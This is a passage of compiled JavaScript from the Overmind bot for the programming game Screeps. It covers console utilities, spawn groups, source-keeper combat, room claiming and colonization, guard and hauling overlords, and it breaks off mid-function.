    static destroyErrantStructures(roomName) {
        const colony = Overmind.colonies[roomName];
        if (!colony)
            return `${roomName} is not a valid colony!`;
        const room = colony.room;
        const allStructures = room.find(FIND_STRUCTURES);
        let i = 0;
        for (const s of allStructures) {
            if (s.structureType == STRUCTURE_CONTROLLER)
                continue;
            if (!colony.roomPlanner.structureShouldBeHere(s.structureType, s.pos)) {
                const result = s.destroy();
                if (result == OK) {
                    i++;
                }
            }
        }
        return `Destroyed ${i} misplaced structures in ${roomName}.`;
    }
    static destroyAllHostileStructures(roomName) {
        const room = Game.rooms[roomName];
        if (!room)
            return `${roomName} is undefined! (No vision?)`;
        if (!room.my)
            return `${roomName} is not owned by you!`;
        const hostileStructures = room.find(FIND_HOSTILE_STRUCTURES);
        for (const structure of hostileStructures) {
            structure.destroy();
        }
        return `Destroyed ${hostileStructures.length} hostile structures.`;
    }
    static destroyAllBarriers(roomName) {
        const room = Game.rooms[roomName];
        if (!room)
            return `${roomName} is undefined! (No vision?)`;
        if (!room.my)
            return `${roomName} is not owned by you!`;
        for (const barrier of room.barriers) {
            barrier.destroy();
        }
        return `Destroyed ${room.barriers.length} barriers.`;
    }
    // Memory management ===============================================================================================
    static deepCleanMemory() {
        // Clean colony memory
        const protectedColonyKeys = ['defcon', 'roomPlanner', 'roadPlanner', 'barrierPlanner'];
        for (const colName in Memory.colonies) {
            for (const key in Memory.colonies[colName]) {
                if (!protectedColonyKeys.includes(key)) {
                    delete Memory.colonies[colName][key];
                }
            }
        }
        // Suicide any creeps which have no memory
        for (const i in Game.creeps) {
            if (Game.creeps[i].memory == {}) {
                Game.creeps[i].suicide();
            }
        }
        // Remove profiler memory
        delete Memory.profiler;
        // Remove overlords memory from flags
        for (const i in Memory.flags) {
            if (Memory.flags[i].overlords) {
                delete Memory.flags[i].overlords;
            }
        }
        // Clean creep memory
        for (const i in Memory.creeps) {
            // Remove all creep tasks to fix memory leak in 0.3.1
            if (Memory.creeps[i].task) {
                Memory.creeps[i].task = null;
            }
        }
        return `Memory has been cleaned.`;
    }
    static recursiveMemoryProfile(memoryObject, sizes, currentDepth) {
        for (const key in memoryObject) {
            if (currentDepth == 0 || !_.keys(memoryObject[key]) || _.keys(memoryObject[key]).length == 0) {
                sizes[key] = JSON.stringify(memoryObject[key]).length;
            }
            else {
                sizes[key] = {};
                OvermindConsole.recursiveMemoryProfile(memoryObject[key], sizes[key], currentDepth - 1);
            }
        }
    }
    static profileMemory(depth = 1) {
        const sizes = {};
        console.log(`Profiling memory...`);
        const start = Game.cpu.getUsed();
        OvermindConsole.recursiveMemoryProfile(Memory, sizes, depth);
        console.log(`Time elapsed: ${Game.cpu.getUsed() - start}`);
        return JSON.stringify(sizes, undefined, '\t');
    }
    static cancelMarketOrders(filter) {
        const ordersToCancel = !!filter ? _.filter(Game.market.orders, order => filter(order)) : Game.market.orders;
        _.forEach(_.values(ordersToCancel), (order) => Game.market.cancelOrder(order.id));
        return `Canceled ${_.values(ordersToCancel).length} orders.`;
    }
}

const SpawnGroupMemoryDefaults = {
    colonies: [],
    distances: {},
    routes: {},
    // paths    : {},
    expiration: 0,
};
const MAX_LINEAR_DISTANCE = 10; // maximum linear distance to search for ANY spawn group
const MAX_PATH_DISTANCE = 600; // maximum path distance to consider for ANY spawn group
const DEFAULT_RECACHE_TIME = onPublicServer() ? 2000 : 1000;
const defaultSettings = {
    maxPathDistance: 400,
    requiredRCL: 7,
    flexibleEnergy: true,
};
/**
 * SpawnGroup provides a decentralized method of spawning creeps from multiple nearby colonies. Use cases include
 * incubation, spawning large combat groups, etc.
 */
let SpawnGroup = class SpawnGroup {
    constructor(initializer, settings = {}) {
        this.roomName = initializer.pos.roomName;
        // this.room = initializer.room;
        if (!Memory.rooms[this.roomName]) {
            Memory.rooms[this.roomName] = {};
        }
        this.memory = Mem.wrap(Memory.rooms[this.roomName], 'spawnGroup', SpawnGroupMemoryDefaults);
        this.ref = initializer.ref + ':SG';
        this.stats = {
            avgDistance: (_.sum(this.memory.distances) / _.keys(this.memory.distances).length) || 100,
        };
        this.requests = [];
        this.settings = _.defaults(settings, defaultSettings);
        if (Game.time >= this.memory.expiration) {
            this.recalculateColonies();
        }
        // Compute stats
        this.colonyNames = _.filter(this.memory.colonies, roomName => this.memory.distances[roomName] <= this.settings.maxPathDistance &&
            Game.rooms[roomName] && Game.rooms[roomName].my &&
            Game.rooms[roomName].controller.level >= this.settings.requiredRCL);
        if (this.colonyNames.length == 0) {
            log.warning(`No colonies meet the requirements for SwarmGroup: ${this.ref}`);
        }
        this.energyCapacityAvailable = _.max(_.map(this.colonyNames, roomName => Game.rooms[roomName].energyCapacityAvailable));
        Overmind.spawnGroups[this.ref] = this;
    }
    /**
     * Refresh the state of the spawnGroup; called by the Overmind object.
     */
    refresh() {
        this.memory = Mem.wrap(Memory.rooms[this.roomName], 'spawnGroup', SpawnGroupMemoryDefaults);
        this.requests = [];
    }
    recalculateColonies() {
        const colonyRoomsInRange = _.filter(getAllColonyRooms(), room => Game.map.getRoomLinearDistance(room.name, this.roomName) <= MAX_LINEAR_DISTANCE);
        const colonies = [];
        const routes = {};
        // let paths = {} as { [colonyName: string]: { startPos: RoomPosition, path: string[] } };
        const distances = {};
        for (const colonyRoom of colonyRoomsInRange) {
            const spawn = colonyRoom.spawns[0];
            if (spawn) {
                const route = Pathing.findRoute(colonyRoom.name, this.roomName);
                const path = Pathing.findPathToRoom(spawn.pos, this.roomName, { route: route });
                if (route && !path.incomplete && path.path.length <= MAX_PATH_DISTANCE) {
                    colonies.push(colonyRoom.name);
                    routes[colonyRoom.name] = route;
                    // paths[room.name] = path.path;
                    distances[colonyRoom.name] = path.path.length;
                }
            }
        }
        this.memory.colonies = colonies;
        this.memory.routes = routes;
        // this.memory.paths = TODO
        this.memory.distances = distances;
        this.memory.expiration = getCacheExpiration(DEFAULT_RECACHE_TIME, 25);
    }
    enqueue(request) {
        this.requests.push(request);
    }
    /**
     * SpawnGroup.init() must be called AFTER all hatcheries have been initialized
     */
    init() {
        // Most initialization needs to be done at init phase because colonies are still being constructed earlier
        const colonies = _.compact(_.map(this.colonyNames, name => Overmind.colonies[name]));
        const hatcheries = _.compact(_.map(colonies, colony => colony.hatchery));
        const distanceTo = (hatchery) => this.memory.distances[hatchery.pos.roomName] + 25;
        // Enqueue all requests to the hatchery with least expected wait time that can spawn full-size creep
        for (const request of this.requests) {
            const maxCost = bodyCost(request.setup.generateBody(this.energyCapacityAvailable));
            const okHatcheries = _.filter(hatcheries, hatchery => hatchery.room.energyCapacityAvailable >= maxCost);
            // || this.settings.flexibleEnergy);
            const bestHatchery = minBy(okHatcheries, hatchery => hatchery.nextAvailability + distanceTo(hatchery));
            if (bestHatchery) {
                bestHatchery.enqueue(request);
            }
            else {
                log.warning(`Could not enqueue creep ${request.setup.role} in ${this.roomName}, ` +
                    `no hatchery with ${maxCost} energy capacity`);
            }
        }
    }
    run() {
        // Nothing goes here
    }
};
SpawnGroup = __decorate([
    profile
], SpawnGroup);

/**
 * CombatOverlords extend the base Overlord class to provide additional combat-specific behavior
 */
let CombatOverlord = class CombatOverlord extends Overlord {
    constructor(directive, name, priority, requiredRCL) {
        super(directive, name, priority);
        this.directive = directive;
        this.requiredRCL = requiredRCL;
        this.spawnGroup = new SpawnGroup(this, { requiredRCL: this.requiredRCL });
    }
    // Standard sequence of actions for running combat creeps
    autoRun(roleCreeps, creepHandler) {
        for (const creep of roleCreeps) {
            if (creep.hasValidTask) {
                creep.run();
            }
            else {
                if (this.shouldBoost(creep)) {
                    this.handleBoosting(creep);
                }
                else {
                    creepHandler(creep);
                }
            }
        }
    }
};
CombatOverlord = __decorate([
    profile
], CombatOverlord);

var SourceReaperOverlord_1;
/**
 * SourceReaperOverlord -- spawns offensive creeps to allow source keeper mining
 */
let SourceReaperOverlord = SourceReaperOverlord_1 = class SourceReaperOverlord extends CombatOverlord {
    constructor(directive, priority = OverlordPriority.remoteSKRoom.sourceReaper) {
        super(directive, 'sourceReaper', priority, SourceReaperOverlord_1.requiredRCL);
        this.directive = directive;
        this.priority += this.outpostIndex * OverlordPriority.remoteSKRoom.roomIncrement;
        this.reapers = this.combatZerg(Roles.melee);
        this.defenders = this.combatZerg(Roles.ranged);
        this.memory = Mem.wrap(this.directive.memory, 'sourceReaper');
        this.computeTargetLair();
    }
    computeTargetLair() {
        this.targetLair = this.memory.targetLairID ? deref(this.memory.targetLairID) : undefined;
        if (!this.targetLair || (this.targetLair.ticksToSpawn || Infinity) >= 299) {
            this.targetLair = this.getNextTargetLair();
        }
    }
    refresh() {
        super.refresh();
        this.memory = Mem.wrap(this.directive.memory, 'sourceReaper');
        this.computeTargetLair();
    }
    init() {
        const defenderAmount = this.room && (this.room.invaders.length > 0
            || RoomIntel.isInvasionLikely(this.room)) ? 1 : 0;
        this.wishlist(1, CombatSetups.zerglings.sourceKeeper);
        this.wishlist(defenderAmount, CombatSetups.hydralisks.sourceKeeper);
    }
    getNextTargetLair() {
        if (!this.room)
            return;
        // If any lairs have an active keeper, target that
        const activeLair = _.find(this.room.keeperLairs, lair => lair.pos.findInRange(lair.room.sourceKeepers, 5).length > 0);
        if (activeLair)
            return activeLair;
        // Otherwise target whatever is closest to spawning
        return minBy(this.room.keeperLairs, lair => lair.ticksToSpawn || Infinity); // not sure why ticksToSpawn is number | undefined
    }
    handleReaper(reaper) {
        // Go to keeper room
        if (!this.targetLair || !this.room || reaper.room != this.room || reaper.pos.isEdge) {
            // log.debugCreep(reaper, `Going to room!`);
            reaper.healSelfIfPossible();
            reaper.goTo(this.pos);
            return;
        }
        if (this.room.invaders.length > 0) {
            // Handle invader actions
            // log.debugCreep(reaper, `Handling invader actions!`);
            if (reaper.hits >= reaper.hitsMax * .5) {
                const result = reaper.autoMelee(this.room.invaders);
                if (result == undefined) { // didn't attack
                    reaper.autoHeal();
                }
            }
            else {
                reaper.healSelfIfPossible();
            }
            // Kite around ranged invaders until a defender arrives
            if (this.room.invaders.length > 2 && _.filter(this.defenders, def => def.room == this.room).length == 0) {
                reaper.kite(_.filter(this.room.hostiles, hostile => hostile.getActiveBodyparts(RANGED_ATTACK) > 0));
                reaper.healSelfIfPossible();
            }
            // If defender is already here or a small invasion
            else {
                const target = CombatTargeting.findTarget(reaper, this.room.invaders);
                if (target) {
                    Movement.invasionMove(reaper, target);
                }
                else {
                    log.warning(`KeeperReaper@${reaper.pos.print}: no invader target!`);
                }
            }
        }
        else {
            // log.debugCreep(reaper, `Standard keeperReaper actions`);
            // Standard keeperReaper actions
            const nearestHostile = reaper.pos.findClosestByRange(this.room.hostiles);
            if (nearestHostile && reaper.pos.isNearTo(nearestHostile)) {
                reaper.attack(nearestHostile);
                reaper.move(reaper.pos.getDirectionTo(nearestHostile));
            }
            else {
                const keeper = this.targetLair.pos.findClosestByLimitedRange(this.room.sourceKeepers, 7);
                if (keeper) { // attack the source keeper
                    // stop and heal at range 4 if needed
                    const approachRange = (reaper.hits == reaper.hitsMax || reaper.pos.getRangeTo(keeper) <= 3) ? 1 : 4;
                    reaper.goTo(keeper, { range: approachRange });
                }
                else { // travel to next lair
                    reaper.goTo(this.targetLair, { range: 1 });
                }
            }
            reaper.healSelfIfPossible();
        }
    }
    handleDefender(defender) {
        // Go to keeper room
        if (!this.targetLair || !this.room || defender.room != this.room || defender.pos.isEdge) {
            debug(defender, `Going to room!`);
            defender.healSelfIfPossible();
            defender.goToRoom(this.pos.roomName);
            return;
        }
        if (this.room.invaders.length > 0) {
            // Handle invader actions
            debug(defender, `AutoCombat`);
            defender.autoSkirmish(this.room.name);
        }
        else {
            debug(defender, `Standard duty`);
            const minKeepersToHelp = this.reapers.length == 0 ? 1 : 2;
            if (this.room.sourceKeepers.length >= minKeepersToHelp) {
                // Help out with keeper reaping
                defender.autoRanged();
                defender.autoHeal(false);
                const reaper = defender.pos.findClosestByRange(this.reapers);
                if (reaper) {
                    defender.goTo(reaper, {
                        movingTarget: defender.pos.getRangeTo(reaper) > 8,
                        maxRooms: 1,
                        repath: 0.1
                    });
                }
                else {
                    const keeper = this.targetLair.pos.findClosestByLimitedRange(this.room.sourceKeepers, 7);
                    if (keeper) { // attack the source keeper
                        const range = defender.pos.getRangeTo(keeper);
                        const keepAtRange = defender.hits < defender.hitsMax * .9 ? 4 : 3;
                        if (range < keepAtRange) {
                            defender.kite(this.room.hostiles, { range: keepAtRange });
                        }
                        else if (range > keepAtRange) {
                            defender.goTo(keeper, { maxRooms: 1, range: keepAtRange });
                        }
                    }
                    else { // travel to next lair
                        defender.goTo(this.targetLair, { range: 5 });
                    }
                }
            }
            else {
                // Do medic actions
                debug(defender, `Medic actions`);
                defender.doMedicActions(this.room.name);
            }
        }
    }
    run() {
        this.autoRun(this.reapers, reaper => this.handleReaper(reaper));
        this.autoRun(this.defenders, defender => this.handleDefender(defender));
    }
    visuals() {
        if (this.room && this.targetLair) {
            Visualizer.marker(this.targetLair.pos);
        }
    }
};
SourceReaperOverlord.requiredRCL = 7;
SourceReaperOverlord = SourceReaperOverlord_1 = __decorate([
    profile
], SourceReaperOverlord);

/**
 * Remote mining directive for source keeper rooms
 */
let DirectiveSKOutpost = class DirectiveSKOutpost extends Directive {
    constructor(flag) {
        super(flag, colony => colony.level >= 7);
    }
    spawnMoarOverlords() {
        this.overlords.sourceReaper = new SourceReaperOverlord(this);
    }
    init() {
    }
    run() {
    }
};
DirectiveSKOutpost.directiveName = 'outpostSK';
DirectiveSKOutpost.color = COLOR_PURPLE;
DirectiveSKOutpost.secondaryColor = COLOR_YELLOW;
DirectiveSKOutpost = __decorate([
    profile
], DirectiveSKOutpost);

/**
 * GameCache does initial low-level preprocessing before each tick is run
 */
let GameCache = class GameCache {
    constructor() {
        this.overlords = {};
        this.creepsByColony = {};
        this.targets = {};
        this.outpostFlags = _.filter(Game.flags, flag => DirectiveOutpost.filter(flag)
            || DirectiveSKOutpost.filter(flag));
    }
    cacheCreepsByColony() {
        this.creepsByColony = _.groupBy(Game.creeps, creep => creep.memory["C" /* COLONY */]);
    }
    /**
     * Generates a hash table for creeps assigned to each object: key: OLref, val: (key: role, val: names[])
     */
    cacheOverlords() {
        this.overlords = {};
        // keys: overlordRef, value: creepNames[]
        const creepNamesByOverlord = _.groupBy(_.keys(Game.creeps), name => Game.creeps[name].memory["O" /* OVERLORD */]);
        for (const ref in creepNamesByOverlord) {
            // keys: roleName, value: creepNames[]
            this.overlords[ref] = _.groupBy(creepNamesByOverlord[ref], name => Game.creeps[name].memory.role);
        }
    }
    /**
     * Generates a hash table for targets: key: TargetRef, val: targeting creep names
     */
    cacheTargets() {
        this.targets = {};
        for (const i in Game.creeps) {
            const creep = Game.creeps[i];
            let task = creep.memory.task;
            while (task) {
                if (!this.targets[task._target.ref])
                    this.targets[task._target.ref] = [];
                this.targets[task._target.ref].push(creep.name);
                task = task._parent;
            }
        }
    }
    build() {
        this.cacheCreepsByColony();
        this.cacheOverlords();
        this.cacheTargets();
    }
    refresh() {
        this.cacheCreepsByColony();
        this.cacheOverlords();
        this.cacheTargets();
    }
};
GameCache = __decorate([
    profile
], GameCache);

const AllContracts = [];

/**
 * Claim an unowned room
 */
let ClaimingOverlord = class ClaimingOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.colonization.claim) {
        super(directive, 'claim', priority);
        this.directive = directive;
        this.claimers = this.zerg(Roles.claim);
    }
    init() {
        const amount = $.number(this, 'claimerAmount', () => {
            if (this.room) { // if you have vision
                if (this.room.my) { // already claimed
                    return 0;
                }
                else { // don't ask for claimers if you can't reach controller
                    const pathablePos = this.room.creeps[0] ? this.room.creeps[0].pos
                        : Pathing.findPathablePosition(this.room.name);
                    if (!Pathing.isReachable(pathablePos, this.room.controller.pos, _.filter(this.room.structures, s => !s.isWalkable))) {
                        return 0;
                    }
                }
            }
            return 1; // otherwise ask for 1 claimer
        });
        this.wishlist(amount, Setups.infestors.claim);
    }
    handleClaimer(claimer) {
        if (claimer.room == this.room && !claimer.pos.isEdge) {
            if (!this.room.controller.signedByMe) {
                // Takes care of an edge case where planned newbie zone signs prevents signing until room is reserved
                if (!this.room.my && this.room.controller.signedByScreeps) {
                    claimer.task = Tasks.claim(this.room.controller);
                }
                else {
                    claimer.task = Tasks.signController(this.room.controller);
                }
            }
            else {
                claimer.task = Tasks.claim(this.room.controller);
            }
        }
        else {
            claimer.goTo(this.pos, { ensurePath: true, avoidSK: true, waypoints: this.directive.waypoints });
        }
    }
    run() {
        this.autoRun(this.claimers, claimer => this.handleClaimer(claimer));
    }
};
ClaimingOverlord = __decorate([
    profile
], ClaimingOverlord);

/**
 * Claims a new room, destroys all structures in the room, then unclaims it
 */
let DirectiveClearRoom = class DirectiveClearRoom extends Directive {
    constructor(flag) {
        super(flag, colony => colony.level >= 3);
        // Remove if misplaced
        if (Cartographer.roomType(this.pos.roomName) != ROOMTYPE_CONTROLLER) {
            log.warning(`${this.print}: ${printRoomName(this.pos.roomName)} is not a controller room; ` +
                `removing directive!`);
            this.remove(true);
        }
    }
    spawnMoarOverlords() {
        this.overlords.claim = new ClaimingOverlord(this);
    }
    init() {
        this.alert(`Clearing out room`);
    }
    removeAllStructures() {
        const keepStorageStructures = this.memory.keepStorageStructures !== undefined
            ? this.memory.keepStorageStructures : true;
        const keepRoads = this.memory.keepRoads !== undefined ? this.memory.keepRoads : true;
        const keepContainers = this.memory.keepContainers !== undefined ? this.memory.keepContainers : true;
        if (this.room) {
            const allStructures = this.room.find(FIND_STRUCTURES);
            let i = 0;
            for (const s of allStructures) {
                if (s.structureType == STRUCTURE_CONTROLLER)
                    continue;
                if (keepStorageStructures &&
                    (s.structureType == STRUCTURE_STORAGE || s.structureType == STRUCTURE_TERMINAL)) {
                    continue;
                }
                if (keepRoads && s.structureType == STRUCTURE_ROAD) {
                    continue;
                }
                if (keepContainers && s.structureType == STRUCTURE_CONTAINER) {
                    continue;
                }
                const result = s.destroy();
                if (result == OK) {
                    i++;
                }
            }
            log.alert(`Destroyed ${i} structures in ${this.room.print}.`);
            return true;
        }
        else {
            return false;
        }
    }
    run() {
        // Remove if structures are done
        if (this.room && this.room.my) {
            const done = this.removeAllStructures();
            if (done) {
                this.room.controller.unclaim();
                log.notify(`Removing clearRoom directive in ${this.pos.roomName}: operation completed.`);
                this.remove();
            }
        }
        // Remove if owned by other player
        if (Game.time % 10 == 2 && this.room && !!this.room.owner && this.room.owner != MY_USERNAME) {
            log.notify(`Removing clearRoom directive in ${this.pos.roomName}: room already owned by another player.`);
            this.remove();
        }
    }
};
DirectiveClearRoom.directiveName = 'clearRoom';
DirectiveClearRoom.color = COLOR_PURPLE;
DirectiveClearRoom.secondaryColor = COLOR_ORANGE;
DirectiveClearRoom = __decorate([
    profile
], DirectiveClearRoom);

/**
 * Spawn pioneers - early workers which help to build a spawn in a new colony, then get converted to workers or drones
 */
let PioneerOverlord = class PioneerOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.colonization.pioneer) {
        super(directive, 'pioneer', priority);
        this.directive = directive;
        this.pioneers = this.zerg(Roles.pioneer);
        this.spawnSite = this.room ? _.filter(this.room.constructionSites, s => s.structureType == STRUCTURE_SPAWN)[0] : undefined;
    }
    refresh() {
        super.refresh();
        this.spawnSite = this.room ? _.filter(this.room.constructionSites, s => s.structureType == STRUCTURE_SPAWN)[0] : undefined;
    }
    init() {
        this.wishlist(4, Setups.pioneer);
    }
    findStructureBlockingController(pioneer) {
        const blockingPos = Pathing.findBlockingPos(pioneer.pos, pioneer.room.controller.pos, _.filter(pioneer.room.structures, s => !s.isWalkable));
        if (blockingPos) {
            const structure = blockingPos.lookFor(LOOK_STRUCTURES)[0];
            if (structure) {
                return structure;
            }
            else {
                log.error(`${this.print}: no structure at blocking pos ${blockingPos.print}! (Why?)`);
            }
        }
    }
    handlePioneer(pioneer) {
        // Ensure you are in the assigned room
        if (pioneer.room == this.room && !pioneer.pos.isEdge) {
            // Remove any blocking structures preventing claimer from reaching controller
            if (!this.room.my && this.room.structures.length > 0) {
                const dismantleTarget = this.findStructureBlockingController(pioneer);
                if (dismantleTarget) {
                    pioneer.task = Tasks.dismantle(dismantleTarget);
                    return;
                }
            }
            // Build and recharge
            if (pioneer.carry.energy == 0) {
                pioneer.task = Tasks.recharge();
            }
            else if (this.room && this.room.controller &&
                (this.room.controller.ticksToDowngrade < 2500 || !this.spawnSite) &&
                !(this.room.controller.upgradeBlocked > 0)) {
                // Save controller if it's about to downgrade or if you have nothing else to do
                pioneer.task = Tasks.upgrade(this.room.controller);
            }
            else if (this.spawnSite) {
                pioneer.task = Tasks.build(this.spawnSite);
            }
        }
        else {
            // pioneer.task = Tasks.goTo(this.pos);
            pioneer.goTo(this.pos, { ensurePath: true, avoidSK: true, waypoints: this.directive.waypoints });
        }
    }
    run() {
        this.autoRun(this.pioneers, pioneer => this.handlePioneer(pioneer));
    }
};
PioneerOverlord = __decorate([
    profile
], PioneerOverlord);

var DirectiveColonize_1;
/**
 * Claims a new room and builds a spawn but does not incubate. Removes when spawn is constructed.
 */
let DirectiveColonize = DirectiveColonize_1 = class DirectiveColonize extends Directive {
    constructor(flag) {
        super(flag, colony => colony.level >= DirectiveColonize_1.requiredRCL
            && colony.name != Directive.getPos(flag).roomName && colony.spawns.length > 0);
        // Register incubation status
        this.toColonize = this.room ? Overmind.colonies[Overmind.colonyMap[this.room.name]] : undefined;
        // Remove if misplaced
        if (Cartographer.roomType(this.pos.roomName) != ROOMTYPE_CONTROLLER) {
            log.warning(`${this.print}: ${printRoomName(this.pos.roomName)} is not a controller room; ` +
                `removing directive!`);
            this.remove(true);
        }
    }
    spawnMoarOverlords() {
        this.overlords.claim = new ClaimingOverlord(this);
        this.overlords.pioneer = new PioneerOverlord(this);
    }
    init() {
        this.alert(`Colonization in progress`);
    }
    run(verbose = false) {
        if (this.toColonize && this.toColonize.spawns.length > 0) {
            // Reassign all pioneers to be miners and workers
            const miningOverlords = _.map(this.toColonize.miningSites, site => site.overlords.mine);
            for (const pioneer of this.overlords.pioneer.pioneers) {
                const miningOverlord = miningOverlords.shift();
                if (miningOverlord) {
                    if (verbose) {
                        log.debug(`Reassigning: ${pioneer.print} to mine: ${miningOverlord.print}`);
                    }
                    pioneer.reassign(miningOverlord, Roles.drone);
                }
                else {
                    if (verbose) {
                        log.debug(`Reassigning: ${pioneer.print} to work: ${this.toColonize.overlords.work.print}`);
                    }
                    pioneer.reassign(this.toColonize.overlords.work, Roles.worker);
                }
            }
            // Remove the directive
            this.remove();
        }
        if (Game.time % 10 == 2 && this.room && !!this.room.owner && this.room.owner != MY_USERNAME) {
            log.notify(`Removing Colonize directive in ${this.pos.roomName}: room already owned by another player.`);
            this.remove();
        }
    }
};
DirectiveColonize.directiveName = 'colonize';
DirectiveColonize.color = COLOR_PURPLE;
DirectiveColonize.secondaryColor = COLOR_GREY;
DirectiveColonize.requiredRCL = 3;
DirectiveColonize = DirectiveColonize_1 = __decorate([
    profile
], DirectiveColonize);

/**
 * Claims a new room and incubates it from the nearest (or specified) colony
 */
let DirectiveIncubate = class DirectiveIncubate extends Directive {
    constructor(flag) {
        super(flag, colony => colony.level >= 7);
        // Register incubation status
        this.incubatee = this.room ? Overmind.colonies[Overmind.colonyMap[this.room.name]] : undefined;
        if (this.incubatee) {
            this.incubatee.isIncubating = true;
            this.incubatee.spawnGroup = new SpawnGroup(this.incubatee);
        }
    }
    spawnMoarOverlords() {
        if (!this.incubatee) { // colony isn't claimed yet
            this.overlords.claim = new ClaimingOverlord(this);
        }
    }
    init() {
    }
    run() {
        if (this.incubatee) {
            if (this.incubatee.level >= 7 && this.incubatee.storage && this.incubatee.terminal) {
                this.remove();
            }
        }
    }
};
DirectiveIncubate.directiveName = 'incubate';
DirectiveIncubate.color = COLOR_PURPLE;
DirectiveIncubate.secondaryColor = COLOR_WHITE;
DirectiveIncubate = __decorate([
    profile
], DirectiveIncubate);

/**
 * Guard swarm overlord: spawns lots of smaller guards to deal with swarm-like attacks or harassments
 */
let GuardSwarmOverlord = class GuardSwarmOverlord extends Overlord {
    constructor(directive, priority = OverlordPriority.outpostDefense.guard) {
        super(directive, 'swarmGuard', priority);
        this.directive = directive;
        this.guards = this.combatZerg(Roles.guardMelee);
    }
    findAttackTarget(guard) {
        if (guard.room.hostiles.length > 0) {
            const targets = _.filter(guard.room.hostiles, hostile => hostile.pos.rangeToEdge > 0);
            return guard.pos.findClosestByRange(targets);
        }
        if (guard.room.hostileStructures.length > 0) {
            return guard.pos.findClosestByRange(guard.room.hostileStructures);
        }
    }
    handleGuard(guard) {
        if (guard.pos.roomName != this.pos.roomName) { // TODO: make edge-safe
            // Move into the assigned room if there is a guard flag present
            guard.goToRoom(this.pos.roomName);
        }
        else { // If you're in the assigned room or if there is no assignment, try to attack or heal
            const attackTarget = this.findAttackTarget(guard);
            if (attackTarget) {
                guard.attackAndChase(attackTarget);
            }
            else {
                guard.park(this.pos); // Move off-road
            }
        }
    }
    init() {
        if (this.directive.memory.amount) {
            this.wishlist(this.directive.memory.amount, CombatSetups.broodlings.early);
        }
        else {
            if (this.room) {
                const smallHostiles = _.filter(this.room.dangerousHostiles, creep => creep.body.length < 10);
                if (smallHostiles.length > 2) {
                    this.wishlist(Math.round(smallHostiles.length), CombatSetups.broodlings.early);
                }
            }
            else {
                this.wishlist(2, CombatSetups.broodlings.early);
            }
        }
    }
    run() {
        for (const guard of this.guards) {
            // Run the creep if it has a task given to it by something else; otherwise, proceed with non-task actions
            if (guard.hasValidTask) {
                guard.run();
            }
            else {
                this.handleGuard(guard);
            }
        }
    }
};
GuardSwarmOverlord = __decorate([
    profile
], GuardSwarmOverlord);

/**
 * Spawns special-purpose haulers for transporting resources to/from a specified target
 */
let HaulingOverlord = class HaulingOverlord extends Overlord {
    constructor(directive, priority = directive.hasDrops ? OverlordPriority.collectionUrgent.haul :
        OverlordPriority.collection.haul) {
        super(directive, 'haul', priority);
        this.directive = directive;
        this.haulers = this.zerg(Roles.transport);
    }
    init() {
        if (!this.colony.storage || _.sum(this.colony.storage.store) > Energetics.settings.storage.total.cap) {
            return;
        }
        // Spawn a number of haulers sufficient to move all resources within a lifetime, up to a max
        const MAX_HAULERS = 5;
        // Calculate total needed amount of hauling power as (resource amount * trip distance)
        const tripDistance = 2 * Pathing.distance((this.colony.storage || this.colony).pos, this.directive.pos);
        const haulingPowerNeeded = Math.min(this.directive.totalResources, this.colony.storage.storeCapacity
            - _.sum(this.colony.storage.store)) * tripDistance;
        // Calculate amount of hauling each hauler provides in a lifetime
        const haulerCarryParts = Setups.transporters.early.getBodyPotential(CARRY, this.colony);
        const haulingPowerPerLifetime = CREEP_LIFE_TIME * haulerCarryParts * CARRY_CAPACITY;
        // Calculate number of haulers
        const numHaulers = Math.min(Math.ceil(haulingPowerNeeded / haulingPowerPerLifetime), MAX_HAULERS);
        // Request the haulers
        this.wishlist(numHaulers, Setups.transporters.early);
    }
    handleHauler(hauler) {
        if (_.sum(hauler.carry) == 0) {
            // Travel to directive and collect resources
            if (hauler.inSameRoomAs(this.directive)) {
                // Pick up drops first
                if (this.directive.hasDrops) {
                    const allDrops = _.flatten(_.values(this.directive.drops));
                    const drop = allDrops[0];
                    if (drop) {
                        hauler.task = Tasks.pickup(drop);
                        return;
                    }
                }
                // Withdraw from store structure
                if (this.directive.storeStructure) {
                    let store = {};
                    if (isStoreStructure(this.directive.storeStructure)) {
                        store = this.directive.storeStructure.store;
                    }
                    else {
                        store = { energy: this.directive.storeStructure.energy };
                    }
                    for (const resourceType in store) {
                        if (store[resourceType] > 0) {
                            hauler.task = Tasks.withdraw(this.directive.storeStructure, resourceType);
                            return;
                        }
                    }
                }
                // Shouldn't reach here
                log.warning(`${hauler.name} in ${hauler.room.print}: nothing to collect!`);
            }
            else {
                // hauler.task = Tasks.goTo(this.directive);
                hauler.goTo(this.directive);
            }
        }
        else {
            // Travel to colony room and deposit resources
            if (hauler.inSameRoomAs(this.colony)) {
                // Put energy in storage and minerals in terminal if there is one
                for (const resourceType in hauler.carry) {
                    if (hauler.carry[resourceType] == 0)
                        continue;
                    if (resourceType == RESOURCE_ENERGY) { // prefer to put energy in storage
                        if (this.colony.storage && _.sum(this.colony.storage.store) < STORAGE_CAPACITY) {
                            hauler.task = Tasks.transfer(this.colony.storage, resourceType);
                            return;
                        }
                        else if (this.colony.terminal && _.sum(this.colony.terminal.store) < TERMINAL_CAPACITY) {
                            hauler.task = Tasks.transfer(this.colony.terminal, resourceType);
                            return;
                        }
                    }
                    else { // prefer to put minerals in terminal
                        if (this.colony.terminal && _.sum(this.colony.terminal.store) < TERMINAL_CAPACITY) {
                            hauler.task = Tasks.transfer(this.colony.terminal, resourceType);
                            return;
                        }
                        else if (this.colony.storage && _.sum(this.colony.storage.store) < STORAGE_CAPACITY) {
                            hauler.task = Tasks.transfer(this.colony.storage, resourceType);
                            return;
                        }
                    }
                }
                // Shouldn't reach here
                log.warning(`${hauler.name} in ${hauler.room.print}: nowhere to put resources!`);
            }
            else {
                hauler.task = Tasks.goToRoom(this.colony.room.name);
            }
        }
    }
    run() {
        for (const hauler of this.haulers) {
            if (hauler.isIdle) {
                this.handleHauler(hauler);
            }
            hauler.run();
        }
    }
};
HaulingOverlord = __decorate([
    profile
], HaulingOverlord);

/**
 * Hauling directive: spawns hauler creeps to move large amounts of resourecs from a location (e.g. draining a storage)
 */
let DirectiveHaul = class DirectiveHaul extends Directive {
    constructor(flag) {
        super(flag);
    }
    spawnMoarOverlords() {
        this.overlords.haul = new HaulingOverlord(this);
    }
    get targetedBy() {
        return Overmind.cache.targets[this.ref];
    }
    get drops() {
        if (!this.pos.isVisible) {
            return {};
        }
        if (!this._drops) {
            const drops = (this.pos.lookFor(LOOK_RESOURCES) || []);
